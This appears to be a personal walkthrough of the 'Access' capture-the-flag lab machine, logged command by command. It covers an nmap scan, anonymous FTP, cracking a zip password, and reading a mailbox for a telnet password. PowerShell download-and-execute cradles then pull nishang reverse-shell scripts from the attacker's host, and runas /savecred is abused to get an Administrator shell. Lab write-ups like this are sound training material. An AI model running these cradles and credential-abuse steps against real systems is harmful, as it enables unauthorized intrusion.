@@ -1,0 +1,354 @@
+Machine-Name  :  Access
+IP-Address    :  10.129.76.214
+
+Command-Line: sudo nmap -A 10.129.76.214
+Result:
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-31 15:23 EST
+    Nmap scan report for 10.129.76.214
+    Host is up (0.062s latency).
+    Not shown: 997 filtered ports
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     Microsoft ftpd
+    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+    |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+    | ftp-syst:
+    |_  SYST: Windows_NT
+    23/tcp open  telnet?
+    80/tcp open  http    Microsoft IIS httpd 7.5
+    | http-methods:
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/7.5
+    |_http-title: MegaCorp
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Device type: general purpose|phone|specialized
+    Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+    OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+    Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    TRACEROUTE (using port 23/tcp)
+    HOP RTT      ADDRESS
+    1   63.89 ms 10.10.14.1
+    2   64.49 ms 10.129.76.214
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 221.88 seconds
+
+
+Command-Line: ftp 10.129.76.214
+Result:
+    Connected to 10.129.76.214.
+    220 Microsoft FTP Service
+    Name (10.129.76.214:kali): anonymous
+    331 Anonymous access allowed, send identity (e-mail name) as password.
+    Password:
+    230 User logged in.
+    Remote system type is Windows_NT.
+    ftp> ls
+    200 PORT command successful.
+    150 Opening ASCII mode data connection.
+    08-23-18  08:16PM       <DIR>          Backups
+    08-24-18  09:00PM       <DIR>          Engineer
+    226 Transfer complete.
+    ftp>
+
+Command-Line: wget -m ftp://10.129.76.214 --no-passive-ftp
+Result: /10.129.76.214
+Command-Line: mv 10.129.76.214 ftp-download
+Result: /ftp-download
+
+
+Command-Line: cd ftp-download/Engineer
+Command-Line: ll
+Result:
+    'Access\ Control.zip'
+    .listing
+
+
+Command-Line: unzip Access\ Control.zip
+Result:
+    Archive:  Access Control.zip
+       skipping: Access Control.pst      unsupported compression method 99
+
+
+
+Command-Line: 7z l -slt Access\ Control.zip
+Result:
+    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)
+
+    Scanning the drive for archives:
+    1 file, 10870 bytes (11 KiB)
+
+    Listing archive: Access Control.zip
+
+    --
+    Path = Access Control.zip
+    Type = zip
+    Physical Size = 10870
+
+    ----------
+    Path = Access Control.pst
+    Folder = -
+    Size = 271360
+    Packed Size = 10678
+    Modified = 2018-08-23 19:13:52
+    Created = 2018-08-23 18:44:57
+    Accessed = 2018-08-23 18:44:57
+    Attributes = A
+    Encrypted = +
+    Comment =
+    CRC = 1D60603C
+    Method = AES-256 Deflate
+    Host OS = FAT
+    Version = 20
+    Volume Index = 0
+
+
+
+Command-Line: 7z x Access\ Control.zip
+Result:
+    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)
+
+    Scanning the drive for archives:
+    1 file, 10870 bytes (11 KiB)
+
+    Extracting archive: Access Control.zip
+    --
+    Path = Access Control.zip
+    Type = zip
+    Physical Size = 10870
+
+
+    Enter password (will not be echoed):
+    ERROR: Wrong password : Access Control.pst
+
+    Sub items Errors: 1
+
+    Archives with Errors: 1
+
+    Sub items Errors: 1
+
+
+Command-Line: zip2john Access\ Control.zip > access-control.hash
+Command-Line: cd ../Backups
+
+Command-Line: strings -n backups.mdb | sort -u > ../Engineer/backup-wordlist
+Command-Line: john access-control.hash --wordlist=backup-wordlist
+Result:
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+    Will run 2 OpenMP threads
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    access4u@security (Access Control.zip/Access Control.pst)
+    1g 0:00:00:00 DONE (2021-01-04 20:59) 100.0g/s 22100p/s 22100c/s 22100C/s 0046}#2...YkkoQMJiO
+    Use the "--show" option to display all of the cracked passwords reliably
+    Session completed
+
+Notes: 1 password found: access4u@security
+
+Command-Line: 7z x Access\ Control.zip
+Result:
+    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)
+
+    Scanning the drive for archives:
+    1 file, 10870 bytes (11 KiB)
+
+    Extracting archive: Access Control.zip
+    --
+    Path = Access Control.zip
+    Type = zip
+    Physical Size = 10870
+
+
+    Would you like to replace the existing file:
+      Path:     ./Access Control.pst
+      Size:     0 bytes
+      Modified: 2018-08-23 19:13:52
+    with the file from archive:
+      Path:     Access Control.pst
+      Size:     271360 bytes (265 KiB)
+      Modified: 2018-08-23 19:13:52
+    ? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y
+
+
+    Enter password (will not be echoed):
+    Everything is Ok
+
+    Size:       271360
+    Compressed: 10870
+
+Notes: File Created:
+    -rw-r--r-- 1 kali kali 271360 Aug 23  2018 'Access Control.pst'
+
+Command-Line: sudo apt search readpst
+Result:
+    pst-utils/kali-rolling,now 0.6.75-1 amd64 [installed]
+  tools for reading Microsoft Outlook PST files
+
+Command-Line: sudo apt-get install pst-utils
+Result: SUCCESSFUL-INSTALL
+
+Command-Line: readpst Access\ Control.pst
+Result:
+    -rw-r--r-- 1 kali kali   3112 Jan  5 17:53 'Access Control.mbox'
+
+
+
+Command-Line: cat Access\ Control.mbox
+Result:
+    From "john@megacorp.com" Thu Aug 23 19:44:07 2018
+    Status: RO
+    From: john@megacorp.com <john@megacorp.com>
+    Subject: MegaCorp Access Control System "security" account
+    To: 'security@accesscontrolsystems.com'
+    Date: Thu, 23 Aug 2018 23:44:07 +0000
+    MIME-Version: 1.0
+    Content-Type: multipart/mixed;
+            boundary="--boundary-LibPST-iamunique-2054016431_-_-"
+
+
+    ----boundary-LibPST-iamunique-2054016431_-_-
+    Content-Type: multipart/alternative;
+            boundary="alt---boundary-LibPST-iamunique-2054016431_-_-"
+
+    --alt---boundary-LibPST-iamunique-2054016431_-_-
+    Content-Type: text/plain; charset="utf-8"
+
+    Hi there,
+
+
+
+    The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+
+
+
+    Regards,
+
+    John
+
+
+    --alt---boundary-LibPST-iamunique-2054016431_-_-
+    Content-Type: text/html; charset="us-ascii"
+
+    <html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)">
+
+
+Notes: Found new password: 4Cc3ssC0ntr0ller. Possible username: security
+
+Command-Line: ssh security@10.129.76.214
+Result: Hanging...
+
+Command-Line: telnet 10.129.76.214
+Result:
+    Trying 10.129.76.214...
+    Connected to 10.129.76.214.
+    Escape character is '^]'.
+    Welcome to Microsoft Telnet Service
+
+    login: security
+    password: 4Cc3ssC0ntr0ller
+
+    *===============================================================
+    Microsoft Telnet Server.
+    *===============================================================
+    C:\Users\security>whoami
+    access\security
+    *** USER ACCESS GRANTED ***
+
+C:\Users\security\Desktop>dir
+Result:
+     Volume in drive C has no label.
+     Volume Serial Number is 9C45-DBF0
+
+     Directory of C:\Users\security\Desktop
+
+    08/28/2018  06:51 AM    <DIR>          .
+    08/28/2018  06:51 AM    <DIR>          ..
+    08/21/2018  10:37 PM                32 user.txt
+                   1 File(s)             32 bytes
+                   2 Dir(s)  16,764,203,008 bytes free
+
+
+C:\Users\security\Desktop>type user.txt
+Result:
+    ff1f3b48913b213a31ff6756d2553d38
+    *** USER OWNED ***
+
+
+Command-Line: nc -nlvp 6016
+Command-Line: sudo python3 -m http.server --bind 10.10.14.89
+
+PS C:\Users\security> cmdkey /list
+Results:
+    Currently stored credentials:
+
+        Target: Domain:interactive=ACCESS\Administrator
+        Type: Domain Password
+        User: ACCESS\Administrator
+
+
+C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.89:8000/nishang.ps1')"
+Result:
+    kali@kali:~$ nc -lnvp 6016
+    listening on [any] 6016 ...
+    connect to [10.10.14.89] from (UNKNOWN) [10.129.76.214] 49160
+    Windows PowerShell running as user security on ACCESS
+    Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+    PS C:\Users\security\Desktop>whoami
+    access\security
+    PS C:\Users\security\Desktop>
+    *** POWERSHELL ***
+
+C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.89:8000/jaws-enum.ps1')"
+Notes: Enumeration results completed.
+
+
+Command-Line: echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.89:8000/nishang_9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
+Result:
+    SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAOQA6ADgAMAAwADAALwBuAGkAcwBoAGEAbgBnAF8AOQAwADAAMgAuAHAAcwAxACcAKQA=
+
+
+PS C:\Users\Public> cd Desktop
+PS C:\Users\Public/Desktop> dir
+Result:
+    Mode                LastWriteTime     Length Name
+    ----                -------------     ------ ----
+    -a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk
+
+
+PS C:\Users\Public/Desktop> get-content "ZKAccess3.5 Security System.lnk"
+Result:
+    L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?
+                                                                                                               runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
+                                                                                                                ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3
+                                   O?j)?H???
+                                            )??[?_???8{E?3
+                                                          O?j)?H???
+                                                                   )??[?    ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
+
+
+Notes: runas user:ACCESS\Administrator /savecred
+
+C:\Users\security\Desktop> $Wscript = New-Object -ComObject Wscript.Shell
+C:\Users\security\Desktop> $shortcut = Get-ChildItem *.lnk
+Command-Line: nc -lnvp nishang_9002
+Command-Line: cp nishang.ps1 nishang_9002.ps1
+Notes: Changed port inside of file to 9002
+C:\Users\security\Desktop> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAOQA6ADgAMAAwADAALwBuAGkAcwBoAGEAbgBnAF8AOQAwADAAMgAuAHAAcwAxACcAKQA="
+Result:
+    *** ROOT ACCESS ***
+
+PS C:\Windows\system32> cd /Users/Administrator/Desktop
+PS C:\Windows\system32> type root.txt
+Result:
+    6e1586cc7ab230a8d297e8f933d904cf
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
